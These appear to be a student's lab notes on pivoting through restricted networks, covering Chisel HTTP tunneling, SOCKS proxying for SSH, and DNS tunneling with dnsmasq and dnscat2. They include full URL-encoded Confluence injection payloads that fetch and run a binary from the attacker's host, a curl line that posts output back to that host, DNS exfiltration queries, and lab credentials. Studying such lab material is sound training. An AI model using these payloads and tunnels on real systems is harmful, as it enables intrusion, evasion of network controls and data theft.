HTTP Tunneling Theory and Practice

HTTP Tunneling Fundamenta;s

Scenario:
CONFLUENCE01 compromised again, can exe command via http requests

aDPI solution is now terminating all outbound traffic except HTTP, inbound ports are blocked except TCP/8090, there's no reverse shell as it's not HTTP, no SSH for the same reason

HTTP Tunneling with Chisel

Chisel is a HTTP tunneling tool that encapsulates data stream within HTTP, it also uses SSH so the HTTP wrapper is safe

Chisel uses client/server, server must be set up

reverse port forwarding is particularly useful which is like ssh remote port forwarding

plan is to run Chisel server on Kali, which will be connected to via CONFLUENCE01 Chisel client

Chisel bind a SOCKS proxy port on kali, it will encapsulate all packets through SOCKS port and push it through the HTTP tunnel

before starting the server we need to copy Chisel client to CONFLUENCE01, server and client are same binary, inied with server or client as first argument

sudo cp $(which chisel) .
to copy chisel to home/kali

wget <myip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
download command on target server

curl http://<targetip>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20<myip>/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
fully constructed curl command for this senario

chisel server --port 8080 --reverse
on kali starting the server

/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
we're going to run this on the target
R: reverse tunnel using socks proxy (1080 by default)
>/dev/null 2>&1 &
force to run in background, so injection doesn't hang

curl http://<targetip>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<myip>:8080%20R:socks%27%29.start%28%29%22%29%7D/
constructed command

if there is something wrong with the Chisel client process:

/tmp/chisel client <myip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<myip>:8080/
this redirects stdout and stderr to a file and send the content over HTTP back to kali
&> directs all streams to stdout and write to /tmp/output
curl with --data it will read the file at /tmp/output and POST it back to kali

curl http://<targetip>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<myip>:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://<myip>:8080/%27%29.start%28%29%22%29%7D/

this way to can check for attempted connection via the python3 log

Suppose versoin incompatibility

chisel -h
to check version

note that: error may appear wheen binaries compiled with go version 1.20<  are run on os that don't have glibc that's compatible

wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
this is a version compiled on go 1.19

gunzip chisel_1.8.1_linux_amd64.gz
to unpack

and serve the older version, and implement

ss -ntplu
to check for connection

SSH doesn't offer generic SOCKS proxy command-line option, it offers the ProxyComand config option

ProxyCommand accepts shell command this is used to open proxy enabled channel, but kali native netcat doesn't support proxying

we use ncat
sudo apt install ncat

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@<targetip db>
so we now pass ncat to proxycommand, it uses socks5 protocol
proxy socket is at 127.0.0.1:1080 since it's 1080 by default
%h %p represent ssh command host and port value

remeber to change /etc/proxychains config to 1080 to use with chisel


DNS Tunneling Theory and Practice

DNS Tunneling Fundamentals

IP address are non human readable IPv4 && v6, so we need to query a DNS server to resolve to IPv4 of www.examplename.com

DNS recursive resolve server for a DNS address record A record

A record is a data type that contains IPv4 address

The recursive resilver does most of the work, it makes DNS queries until it satisfies the DNS request

once request is recived, the recursive resolver queries root name servers, sends DNS query to one of the root name server, .com suffix will corespond to root name server responding with address of a DNS name server that's responsible for .com top-level domain:
a TLD name server

recursive resolver queries .com TLD name server for DNS server that's for examplpe.com, TLD name server responds with authoritative name server for the domain

recurisve resolver asks example.com authoritative name server for IPv4 for www.example.com and ans reply

recursive resolver returns IPv4 to user via UDP/53

suppose MULTISERVER03 is DNS, a bew server FELINEAUTHORITY, on the WAN


FELINEAUTHORITY -> ans feline.corp
username kali and the password 7he_C4t_c0ntro11er

note that in the real world, registration of said server ans needed to be done manuelly for DNS tunneling or social engineering needs

to make FA a functional DNS server:
Dnsmasq

for FA case only:
cd dns_tunneling
cat dnsmasq.conf
to view configration of dns server

sudo dnsmasq -C dnsmasq.conf -d
starting dnsmasq with -C for config file
-d for no daemon so it runs in the foreground to allow for easy kill

in another shell on FA, set up tcpdump on ens192 interface to pickup DNS traffic

sudo tcpdump -i ens192 udp port 53

now to the DB shell->DNS queries aimed at feline.corp

to confirm DB DNS setting
resolvectl status

nslookup exfiltrated-data.feline.corp
test to see if DNS requests can make it out of DMZ
note that NDOMAIN is expected if DNS server isn't configed to sever records

note that DNS records has escaped DMZ, and it shows that information can be exfiltrated from the DMZ

mechism would be [hex-string].feline.corp and repeat until binary is exfiltrated

Infiltration

TXT record can be used: contains arbitrary string information

cat dnsmasq_txt.conf
sudo dnsmasq -C dnsmasq_txt.conf -d
for TXT info demo

to tunnel out at db
nslookup -type=txt www.feline.corp


DNS Tunneling with dnscat2

dnscat2 to exfiltrate data with dns subdomain queries and infiltrate data with txt

1. start inspecting traffic from FA with tcpdump
sudo tcpdump -i ens192 udp port 53

2. start dnscat2
dnscat2-server feline.corp

3. dnscat2 client dinary from dnscat folder at the database_admin
cd dnscat/
./dnscat feline.corp

4. list all active windows with
windows
windows -i 1
(shell) 
--help

listen operates like ssh -L

hence:
listen 127.0.0.1:4455 172.16.2.11:445 (ssh -L local FA)

so on the FA server we can list all smb shares
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234